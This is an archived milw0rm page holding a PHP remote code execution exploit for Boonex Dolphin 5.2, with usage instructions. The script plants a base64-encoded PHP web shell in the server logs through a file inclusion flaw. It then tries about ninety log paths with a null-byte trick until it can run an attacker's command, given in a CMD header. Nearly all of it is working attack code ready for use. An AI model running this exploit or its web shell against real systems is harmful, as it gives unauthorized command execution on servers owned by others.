<html><head><title>Boonex Dolphin <= 5.2 index.php  Remote Code Execution Exploit</title></head><pre>#!/usr/bin/php
&lt;?php
 /*********************************************************************
 * Boonex Dolphin 5.2 Remote Command Execution / File Inclusion Vulnerability
 * 
 * Note:
 * Requires register globals to be on, and magic quotes gpc to be off.
 *
 * Usage: 
 * php script.php [host] [path] [command]
 *
 * Usage Example:
 * php script.php domain.com /dolphin/ whoami
 *
 * Credit:
 * Synsta - Vulnerability discovery and exploit scripting
 *
 * File Inclusion:
 * &lt;host&gt;/&lt;path&gt;/templates/tmpl_dfl/scripts/index.php?dir[inc]=&lt;local/remotefile&gt;
 * 
 * [w4ck1ng] - w4ck1ng.com
 *********************************************************************/
 
if(!$argv[3 ]){
die(&quot;Usage:
php $argv[0] [host] [path] [command]\n
Usage Example:
php $argv[0] domain.com /dolphin/ whoami\n&quot;);
}

function send($host, $put){
global $data;
$conn = fsockopen( gethostbyname($host),&quot;80&quot; );
if(!$conn) {
die(&quot;Connection to $host failed...&quot;);
}else{
fputs($conn, $put);
}
while(!feof($conn)) {
$data .=fgets( $conn);
}
fclose($conn);
return $data;
}

$host = $argv[ 1];
$path = $argv[ 2];
$cmd = $argv[ 3];

if($argv[3]){

$shellcode = base64_decode( &quot;PD9waHAgaWYoJF9TRVJWRVJbSFRUUF9DTURdKXsgZWNobyBjbWR4cGxzdGFydC5zaGVsbF9leGVjKHN0cmlwc2xhc2hlcygkX1NFUlZFUltIVFRQX0NNRF0pKS5jbWR4cGxlbmQ7IH0gPz4=&quot;);
$req = &quot;GET &quot;. $path.&quot;/templates/tmpl_dfl/scripts/index.php?dir[inc]=$shellcode HTTP/1.1\r\n&quot;;
$req .=&quot;Accept-Encoding: text/plain\r\n&quot; ;
$req .=&quot;Host: &quot;. $host.&quot;\r\n&quot;;
$req .=&quot;Connection: Close\r\n\r\n&quot; ;
send(&quot;$host&quot;, &quot;$req&quot;);

$logs = array(&quot;../../../../../var/log/httpd/access_log&quot; ,
&quot;../../../../../var/log/httpd/error_log&quot;,
&quot;../apache/logs/error.log&quot;,
&quot;../apache/logs/access.log&quot;,
&quot;../../apache/logs/error.log&quot;,
&quot;../../apache/logs/access.log&quot;,
&quot;../../apache2/logs/access_log&quot;,
&quot;../../apache2/logs/error_log&quot;,
&quot;../../../../../../../apache2/logs/access_log&quot;,
&quot;../../../apache/logs/error.log&quot;,
&quot;../../../apache/logs/access.log&quot;,
&quot;../../../../apache/logs/error.log&quot;,
&quot;../../../../apache/logs/access.log&quot;,
&quot;../../../../../apache/logs/error.log&quot;,
&quot;../../../../../apache/logs/access.log&quot;,
&quot;../logs/error.log&quot;,
&quot;../logs/access.log&quot;,
&quot;../../logs/error.log&quot;,
&quot;../../logs/access.log&quot;,
&quot;../../../logs/error.log&quot;,
&quot;../../../logs/access.log&quot;,
&quot;../../../../logs/error.log&quot;,
&quot;../../../../logs/access.log&quot;,
&quot;../../../../../logs/error.log&quot;,
&quot;../../../../../logs/access.log&quot;,
&quot;../../../../../etc/httpd/logs/access_log&quot;,
&quot;../../../../../etc/httpd/logs/access.log&quot;,
&quot;../../../../../etc/httpd/logs/error_log&quot;,
&quot;../../../../../etc/httpd/logs/error.log&quot;,
&quot;../../../../../var/www/logs/access_log&quot;,
&quot;../../../../../var/www/logs/access.log&quot;,
&quot;../../../../../usr/local/apache/logs/access_log&quot;,
&quot;../../../../../usr/local/apache/logs/access.log&quot;,
&quot;../../../../../var/log/apache/access_log&quot;,
&quot;../../../../../var/log/apache/access.log&quot;,
&quot;../../../../../var/log/access_log&quot;,
&quot;../../../../../var/www/logs/error_log&quot;,
&quot;../../../../../var/www/logs/error.log&quot;,
&quot;../../../../../usr/local/apache/logs/error_log&quot;,
&quot;../../../../../usr/local/apache/logs/error.log&quot;,
&quot;../../../../../var/log/apache/error_log&quot;,
&quot;../../../../../var/log/apache/error.log&quot;,
&quot;../../../../../var/log/access_log&quot;,
&quot;../../../../../var/log/error_log&quot;,
&quot;../../../../../../../../../var/log/httpd/access_log&quot;,
&quot;../../../../../../../../../var/log/httpd/error_log&quot;,
&quot;../../../../../apache/logs/error.log&quot;,
&quot;../../../../../apache/logs/access.log&quot;,
&quot;../../../../../../apache/logs/error.log&quot;,
&quot;../../../../../../apache/logs/access.log&quot;,
&quot;../../../../../../apache2/logs/access_log&quot;,
&quot;../../../../../../apache2/logs/error_log&quot;,
&quot;../../../../../../../../../../../apache2/logs/access_log&quot;,
&quot;../../../../../../../apache/logs/error.log&quot;,
&quot;../../../../../../../apache/logs/access.log&quot;,
&quot;../../../../apache/logs/error.log&quot;,
&quot;../../../../apache/logs/access.log&quot;,
&quot;../../../../../apache/logs/error.log&quot;,
&quot;../../../../../apache/logs/access.log&quot;,
&quot;../../../../../logs/error.log&quot;,
&quot;../../../../../logs/access.log&quot;,
&quot;../../../../../../logs/error.log&quot;,
&quot;../../../../../../logs/access.log&quot;,
&quot;../../../../../../../logs/error.log&quot;,
&quot;../../../../../../../logs/access.log&quot;,
&quot;../../../../../../../../logs/error.log&quot;,
&quot;../../../../../../../../logs/access.log&quot;,
&quot;../../../../../../../../../logs/error.log&quot;,
&quot;../../../../../../../../../logs/access.log&quot;,
&quot;../../../../../../../../../etc/httpd/logs/access_log&quot;,
&quot;../../../../../../../../../etc/httpd/logs/access.log&quot;,
&quot;../../../../../../../../../etc/httpd/logs/error_log&quot;,
&quot;../../../../../../../../../etc/httpd/logs/error.log&quot;,
&quot;../../../../../../../../../var/www/logs/access_log&quot;,
&quot;../../../../../../../../../var/www/logs/access.log&quot;,
&quot;../../../../../../../../../usr/local/apache/logs/access_log&quot;,
&quot;../../../../../../../../../usr/local/apache/logs/access.log&quot;,
&quot;../../../../../../../../../var/log/apache/access_log&quot;,
&quot;../../../../../../../../../var/log/apache/access.log&quot;,
&quot;../../../../../../../../../var/log/access_log&quot;,
&quot;../../../../../../../../../var/www/logs/error_log&quot;,
&quot;../../../../../../../../../var/www/logs/error.log&quot;,
&quot;../../../../../../../../../usr/local/apache/logs/error_log&quot;,
&quot;../../../../../../../../../usr/local/apache/logs/error.log&quot;,
&quot;../../../../../../../../../var/log/apache/error_log&quot;,
&quot;../../../../../../../../../var/log/apache/error.log&quot;,
&quot;../../../../../../../../../var/log/access_log&quot;,
&quot;../../../../../../../../../var/log/error_log&quot;);

$i = 0; 
foreach($logs as $value){ 
$logs[$i++];

$req = &quot;GET &quot;. $path.&quot;/templates/tmpl_dfl/scripts/index.php?dir[inc]=$logs[$i]%00 HTTP/1.1\r\n&quot; ;
$req .=&quot;CMD: $cmd\r\n&quot;;
$req .=&quot;Accept-Encoding: text/plain\r\n&quot; ;
$req .=&quot;Host: &quot;. $host.&quot;\r\n&quot;;
$req .=&quot;Connection: Close\r\n\r\n&quot; ;
send(&quot;$host&quot;, &quot;$req&quot;);
print(&quot;Trying $logs[$i]..\n&quot;);

$adata = explode( &quot;cmdxplstart&quot;,$data);
$bdata = explode( &quot;cmdxplend&quot;,$adata[1 ]);
$cdata = $bdata[ 0];

if(eregi(&quot;cmdxplend&quot;,  $data)){ 
if($cdata==NULL){ 
die(&quot;\nExploit succeeded but blank command received..\n&quot;); 
}
die(&quot;\nExploit Succeeded!\n\nCommand Resolution:\n$cdata\n&quot;); 
}
}
}

die(&quot;Exploit failed..&quot;);
?&gt;

# milw0rm.com [2006-10-16]</pre></html>